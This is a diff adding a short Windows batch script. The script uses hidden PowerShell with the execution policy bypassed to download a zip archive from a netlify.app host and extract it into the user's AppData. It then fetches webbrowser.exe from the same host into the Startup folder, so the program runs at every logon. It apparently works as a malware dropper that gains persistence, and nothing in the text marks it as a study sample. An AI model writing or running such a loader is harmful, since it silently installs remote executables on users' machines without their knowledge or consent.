@@ -1,0 +1,24 @@
+@echo off
+setlocal
+
+set "APP_DIR=%USERPROFILE%\AppData\Application"
+set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "TEMP_ZIP=%TEMP%\p.zip"
+
+REM 1. 
+if not exist "%APP_DIR%" mkdir "%APP_DIR%"
+
+REM 2. تنزيل python.zip (http)
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://velvety-pasca-0eb72c.netlify.app/python.zip' -OutFile '%TEMP_ZIP%'"
+
+REM 3.
+if exist "%TEMP_ZIP%" (
+    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%APP_DIR%' -Force"
+    del /f /q "%TEMP_ZIP%"
+)
+
+REM 4. 
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://velvety-pasca-0eb72c.netlify.app/webbrowser.exe' -OutFile '%STARTUP_DIR%\webbrowser.exe'"
+
+REM 5.
+exit
